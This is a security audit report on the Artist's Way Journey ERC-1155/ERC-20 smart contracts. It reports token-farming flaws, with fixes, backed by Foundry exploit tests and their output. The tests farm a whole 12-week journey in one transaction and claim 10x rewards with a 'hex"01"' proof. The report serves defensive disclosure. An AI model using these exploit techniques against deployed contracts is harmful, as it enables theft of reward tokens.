---
title: Artist's Way Journey Smart Contract Security Review
author: Taylor Haun
date: December 5, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Artist's Way Journey\par}
    {\Huge\bfseries Smart Contract Security Review\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Taylor Haun\par}
    \vfill
    {\large December 5, 2024\par}
\end{titlepage}

\maketitle

Prepared by: Taylor Haun

Lead Auditor:
- Taylor Haun

# Table of Contents
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues Found](#issues-found)
- [Findings](#findings)
  - [High Severity](#high-severity)
  - [Medium Severity](#medium-severity)
  - [Low Severity](#low-severity)
  - [Informational](#informational)
  - [Gas Optimizations](#gas-optimizations)
- [Proof of Concept Results](#proof-of-concept-results)

# Protocol Summary

Artist's Way Journey is an on-chain tracking system for Julia Cameron's 12-week creative program, deployed on Base L2. The protocol uses:

- **ArtistWayJourney.sol** - Main ERC-1155 contract for tracking morning pages, artist dates, streaks, and achievements
- **ArtistWayToken.sol** - ERC-20 reward token minted when users complete activities
- **DummyVerifier.sol** - Placeholder ZK verifier (Phase 1)
- **TokenIds.sol** - Library for token ID management

**Token Reward Structure:**
| Activity | BASIC Tier | VERIFIED Tier (10x) |
|----------|-----------|---------------------|
| Morning Page | 10 tokens | 100 tokens |
| Artist Date | 50 tokens | 500 tokens |
| Weekly Badge | 200 tokens | 200 tokens |
| Streak Badge | 300 tokens | 300 tokens |
| Journey Complete | 1000 tokens | 1000 tokens |
| Lifetime Achievement | 400 tokens | 400 tokens |

# Disclaimer

The security researcher makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security review is not an endorsement of the underlying business or product. The review was time-boxed and focused solely on the security aspects of the Solidity implementation.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity.

# Audit Details

**Repository**: artist-way-v5.1
**Commit Hash**: 1836a9b
**Review Period**: December 5, 2024
**Methods**: Manual code review, Foundry testing

## Scope

| Contract | SLOC | Purpose |
|----------|------|---------|
| `contracts/ArtistWayJourney.sol` | ~650 | Main ERC-1155 journey tracking |
| `contracts/ArtistWayToken.sol` | ~85 | ERC-20 reward token |
| `contracts/verifiers/DummyVerifier.sol` | ~50 | Placeholder verifier |
| `contracts/interfaces/IVerifier.sol` | ~45 | Verifier interface |
| `contracts/libraries/TokenIds.sol` | ~200 | Token ID management |

## Roles

| Role | Description |
|------|-------------|
| Owner | Contract deployer; can set verifier, URI, and record activities for users |
| Minter | ArtistWayJourney contract (authorized to mint ERC-20 tokens) |
| User | Can start journeys, record activities, earn tokens and achievements |

# Executive Summary

This security review identified **critical token farming vulnerabilities** in the Artist's Way Journey contracts. The most severe issue allows users to **complete an entire 12-week journey and earn all rewards in a single transaction** by exploiting the lack of timestamp validation.

All findings were verified with Foundry proof-of-concept tests demonstrating:
- **20,950 tokens** farmed in a single transaction
- **60-day streak** achieved instantly
- **7x token advantage** over legitimate users

The core vulnerability: `unixDay` and `timestamp` parameters are user-supplied with no validation against `block.timestamp`. Combined with the DummyVerifier granting VERIFIED tier (10x rewards) for any non-empty proof, attackers can drain the token supply.

## Issues Found

| Severity | Count |
|----------|-------|
| High | 3 |
| Medium | 4 |
| Low | 3 |
| Informational | 3 |
| Gas | 2 |
| **Total** | **15** |

---

# Findings

## High Severity

### [H-1] User-Supplied `unixDay` Allows Complete Token Farm in Single Transaction

**Description**

The `recordMorningPage()` function accepts `unixDay` as a user-supplied parameter without validating it corresponds to the current day:

```solidity
// ArtistWayJourney.sol:267-277
function recordMorningPage(
    uint256 unixDay,        // @audit User-controlled, no validation
    uint256 timestamp,      // @audit User-controlled, no validation
    bytes32 contentHash,
    bytes calldata proof
) external {
    uint256 journeyId = currentJourneyId[msg.sender];
    if (journeyId == 0) revert NoActiveJourney();
    if (journeyCompleted[msg.sender][journeyId]) revert("Journey already complete");
    if (unixDay == 0) revert InvalidUnixDay();
    if (morningPagesLog[msg.sender][journeyId][unixDay]) revert AlreadyLoggedToday();
    // @audit No check that unixDay == block.timestamp / 1 days
```

**Impact**

An attacker can call `recordMorningPage()` 84 times with sequential days and `recordArtistDate()` 12 times in a single transaction, earning all tokens and achievements instantly.

**Proof of Concept**

```solidity
function test_ExploitFarmEntireJourneyInOneTx() public {
    vm.startPrank(attacker);
    journey.startNewJourney();

    uint256 baseDay = block.timestamp / 1 days;

    // Farm 84 morning pages in one transaction
    for (uint256 i = 0; i < 84; i++) {
        journey.recordMorningPage(
            baseDay + i,
            block.timestamp,
            keccak256(abi.encode("page", i)),
            hex"01"
        );
    }

    // Farm 12 artist dates
    for (uint256 week = 1; week <= 12; week++) {
        journey.recordArtistDate(week, block.timestamp, bytes32(0), hex"01");
    }
    vm.stopPrank();

    uint256 tokensEarned = token.balanceOf(attacker);
    // Result: 20,950 tokens in one transaction
}
```

**Test Output**
```
[PASS] test_ExploitFarmEntireJourneyInOneTx()
  Morning pages farmed: 84
  Artist dates farmed: 12
  Actual tokens earned: 20,950
  EXPLOIT SUCCESSFUL - Entire 12-week journey completed in ONE transaction
```

**Recommended Mitigation**

```solidity
function recordMorningPage(...) external {
    uint256 today = block.timestamp / 1 days;
    if (unixDay != today) revert InvalidUnixDay();
    if (timestamp > block.timestamp) revert InvalidTimestamp();
    if (timestamp < block.timestamp - 1 days) revert InvalidTimestamp();
    // ...
}
```

---

### [H-2] DummyVerifier Grants VERIFIED Tier (10x Rewards) for Any Non-Empty Proof

**Description**

The `DummyVerifier` grants VERIFIED tier for any non-empty proof:

```solidity
// DummyVerifier.sol:55-73
function verifyWithTier(bytes calldata proof)
    external pure override
    returns (bool valid, VerificationTier tier)
{
    valid = true;
    if (proof.length == 0) {
        tier = VerificationTier.BASIC;    // 1x rewards
    } else {
        tier = VerificationTier.VERIFIED; // 10x rewards for ANY non-empty bytes
    }
}
```

**Impact**

Any user claims 10x rewards by passing `hex"01"` as proof:
- Morning pages: 10 → 100 tokens
- Artist dates: 50 → 500 tokens

**Test Output**
```
[PASS] test_ExploitVerifiedTierForFree()
  First entry reward: 410 tokens (includes achievements)
  Second entry reward: 100 tokens
  Core exploit: ANY non-empty proof = VERIFIED tier
```

**Recommended Mitigation**

```solidity
// Always return BASIC tier until real ZK verifier is deployed
function verifyWithTier(bytes calldata proof)
    external pure override
    returns (bool valid, VerificationTier tier)
{
    proof;
    return (true, VerificationTier.BASIC);
}
```

---

### [H-3] Streak Manipulation via Out-of-Order Day Submission

**Description**

The streak calculation only checks if the gap between submissions equals 1:

```solidity
function _updateStreak(address user, uint256 journeyId, uint256 currentDay)
    internal returns (uint256)
{
    uint256 lastDay = journeyLastCheckInDay[user][journeyId];
    if (lastDay == 0) {
        journeyStreak[user][journeyId] = 1;
    } else {
        uint256 gap = currentDay - lastDay;
        if (gap == 1) {
            journeyStreak[user][journeyId]++;
        } else {
            journeyStreak[user][journeyId] = 1;
        }
    }
    // ...
}
```

**Impact**

Submitting days 1-60 sequentially achieves all streak badges instantly.

**Test Output**
```
[PASS] test_ExploitInstantStreakAchievements()
  Current streak: 60
  Longest streak: 60
  Tokens from streak badges: 1,200
  Total tokens earned: 7,600
```

**Recommended Mitigation**

```solidity
function _updateStreak(...) internal returns (uint256) {
    uint256 today = block.timestamp / 1 days;
    require(currentDay == today, "Can only log today");
    // ...
}
```

---

## Medium Severity

### [M-1] Global Content Hash Allows Front-Running to Deny VERIFIED Tier

**Description**

Content hashes are stored globally:

```solidity
mapping(bytes32 => bool) public globalUsedHashes;

if (globalUsedHashes[contentHash]) {
    tier = VerificationTier.BASIC;
} else {
    globalUsedHashes[contentHash] = true;
}
```

**Impact**

Attacker monitors mempool, front-runs with victim's `contentHash`, victim gets downgraded to BASIC tier.

**Recommended Mitigation**

```solidity
bytes32 userHash = keccak256(abi.encodePacked(msg.sender, contentHash));
```

---

### [M-2] No Validation That artistToken Minter Is Set Correctly

**Description**

The contract calls `artistToken.mint()` without verifying the minter is configured.

**Impact**

If deployment doesn't call `artistToken.setMinter()`, all recording functions revert permanently.

**Recommended Mitigation**

Add constructor validation or deployment checks.

---

### [M-3] Artist Date Can Be Recorded for Future Weeks

**Description**

```solidity
if (week < 1 || week > 12) revert InvalidWeek();
// @audit No check: week <= getCurrentWeek(user, journeyId)
```

**Impact**

All 12 artist dates recordable immediately = 6,000 tokens (VERIFIED).

**Test Output**
```
[PASS] test_ExploitFutureWeekArtistDates()
  Current week: 1
  Successfully recorded artist dates for weeks: 1, 6, 12
  Tokens earned: 2,150
```

**Recommended Mitigation**

```solidity
uint256 currentWeek = getCurrentWeek(msg.sender, journeyId);
if (week > currentWeek) revert InvalidWeek();
```

---

### [M-4] External Call to Untrusted Verifier Before State Changes

**Description**

External verifier called before state modifications. Currently safe (view function), but risky if verifier is upgraded.

**Recommended Mitigation**

Add `ReentrancyGuard` or restructure to Checks-Effects-Interactions pattern.

---

## Low Severity

### [L-1] setVerifier Has No Zero Address Check

```solidity
function setVerifier(address newVerifier) external onlyOwner {
    verifier = IVerifier(newVerifier);  // No zero check
}
```

**Recommended Mitigation**: Add `require(newVerifier != address(0))`.

---

### [L-2] TokenIds Library Uses require() Instead of Custom Errors

Inconsistent with main contract, higher gas costs.

---

### [L-3] Mixed Error Styles: Custom Errors vs revert() Strings

```solidity
if (journeyId == 0) revert NoActiveJourney();           // Custom error
if (journeyCompleted[...]) revert("Journey already complete"); // String
```

**Recommended Mitigation**: Use custom errors consistently.

---

## Informational

### [I-1] Centralization Risk: Owner Can Record for Any User

`recordMorningPageFor()` and `recordArtistDateFor()` allow owner to mint tokens for any address.

### [I-2] No Event for Streak Updates

Streak changes don't emit events, complicating off-chain tracking.

### [I-3] isProductionReady() Not Used in Main Contract

`DummyVerifier.isProductionReady()` returns false but is never checked.

---

## Gas Optimizations

### [G-1] _isWeekComplete() Performs Redundant Storage Reads

Cache `journeyStartDates` when checking multiple weeks.

### [G-2] String Concatenation in Events Wastes Gas

Emit week number as `uint256` instead of building strings.

---

# Proof of Concept Results

All vulnerabilities were verified with Foundry tests. Run with:

```bash
forge test --match-contract TokenFarmingExploit -vv
```

| Test | Result | Impact Demonstrated |
|------|--------|---------------------|
| `test_ExploitFarmEntireJourneyInOneTx` | PASS | 20,950 tokens in 1 tx |
| `test_ExploitInstantStreakAchievements` | PASS | 60-day streak instantly |
| `test_ExploitFutureWeekArtistDates` | PASS | All weeks recordable day 1 |
| `test_ExploitMultiJourneyFarming` | PASS | 86,750 tokens across 5 journeys |
| `test_ExploitVerifiedTierForFree` | PASS | 10x rewards with `hex"01"` |
| `test_CompareAttackerVsLegitimateUser` | PASS | 7x advantage over honest users |

**Projected Maximum Damage**
```
Per journey:     ~17,000 tokens
MAX_JOURNEYS:    490
Single attacker: ~8,500,000 tokens
```

---

# Appendix

## Tools Used
- Manual code review
- Foundry (forge test)

## Files Reviewed
- `ArtistWayJourney.sol` (1079 lines)
- `ArtistWayToken.sol` (136 lines)
- `DummyVerifier.sol` (93 lines)
- `IVerifier.sol` (73 lines)
- `TokenIds.sol` (305 lines)

## PoC Test File
- `test/TokenFarmingExploit.t.sol`

---

*Security Review by Taylor Haun - December 5, 2024*
